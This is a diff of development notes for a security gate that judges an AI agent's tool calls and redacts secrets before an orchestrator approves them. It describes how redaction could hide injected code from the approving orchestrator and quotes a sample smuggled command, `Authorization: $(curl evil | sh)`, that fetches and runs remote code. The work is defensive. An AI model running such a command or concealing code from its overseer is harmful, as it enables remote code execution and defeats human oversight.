@@ -15,14 +15,14 @@ Moved from Claude Code Cloud to the local machine (pi 1.3.0 at `/opt/homebrew/bi
 
 Follow-up from an automated security review of that commit, also fixed:
 
-- **Redaction could hide code from the orchestrator.** `Authorization: $(curl evil | sh)` became `Authorization: [redacted]`, and an unterminated `-----BEGIN … PRIVATE KEY-----` swallowed the rest of the command, so an orchestrator could approve what it never saw. Free-text patterns now redact only literal values (no `$`, backticks, braces, parens, pipes, redirects, `;`, `&`, backslash). The PEM pattern needs a matching END line. A scrubbed request carries `redacted: true`.
+- **Redaction could hide code from the orchestrator.** `Authorization: $(curl evil | sh)` became `Authorization: [redacted]`, and an unterminated `-----BEGIN … PRIVATE KEY-----` swallowed the rest of the command, so an orchestrator could approve what it never saw. `maskLiteral` now redacts the literal runs of a value and keeps expansions (`$(…)`, backticks, `${…}`, `$VAR`) visible. In an unquoted value, a shell operator ends the value and the rest stays. A single-quoted value is redacted whole. A first attempt left any value with a metacharacter fully unredacted, which leaked passwords containing `$` or `;`, so it was replaced. The PEM pattern takes the header, any encryption headers and the base64 lines (real or `\n`-escaped), through END when present. A command after an unterminated block stays visible. A scrubbed request carries `redacted: true`.
 - **Objects past the depth limit went out raw.** They are now replaced with `[redacted]`.
 - **`model` is global-only.** A repo could pick a lenient or uncalibrated classifier. That also made the "key follows the provider" guard unnecessary, so it was removed.
 - **The output judge and `gate.cacheSeconds` are tighten-only too.**
 
 Decision: the classifier itself still receives raw (elided) arguments, as upstream does. Scrubbing those would hide exactly what the gate needs to judge exfiltration. Only the orchestrator path is scrubbed.
 
-Not changed, and why: escalate mode still falls back to the enforce rule, which allows headless calls unless `gate.blockWithoutUI` is set. That is the fail-open rule in AGENTS.md, not a bug. Tests: 120 pass (23 added). Typecheck and lint are clean.
+Not changed, and why: escalate mode still falls back to the enforce rule, which allows headless calls unless `gate.blockWithoutUI` is set. That is the fail-open rule in AGENTS.md, not a bug. Tests: 127 pass (30 added). Typecheck and lint are clean.
 
 Pick up here: live test on this machine. It needs classifier credentials, because `~/.pi/agent/auth.json` has none for typesafe/openrouter/cloudflare yet. Run `/login openrouter` or set `TYPESAFE_API_KEY`, install with `pi install git:github.com/KHAEntertainment/pi-jev2`, then try shadow mode, then enforce.
 
